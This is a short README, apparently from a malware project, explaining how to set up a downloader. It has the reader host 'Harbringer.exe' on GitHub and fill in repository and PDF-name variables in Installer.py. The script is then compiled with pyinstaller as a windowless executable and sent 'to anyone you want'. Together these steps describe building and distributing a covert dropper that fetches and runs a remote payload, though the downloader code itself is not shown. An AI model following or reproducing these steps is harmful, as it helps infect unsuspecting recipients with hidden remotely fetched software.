# Installer Setup

So if you decided to come here, you'll be wanting to setup a small installation file, here's how. 
(note: this will made to work with a github account, if you have any other hosting services to use which will allow for downloading of files using a python script feel free to use that instead, but this won't show you how...) 

## Post-Preperation: 

1. Make a Github Account. 
2. Make a new repository. 
3. Upload the Harbringer.exe to that repository. 

## Preperation: 

1. In the Installer.py change the following variables: `GITHUB_USERNAME`, `NAME_OF_REPO`and `NAME_OF_PDF` with the necessary strings. 
2. Now compile  the file into an executable by doing the following, opening a cmd or pwoershell terminal where u have the file saved, the running the command: `pyinstaller Installer.py --onefile --noconsole`
3. Now you have set thsi all up, you can go on to send the Installer.exe to anyone you want. 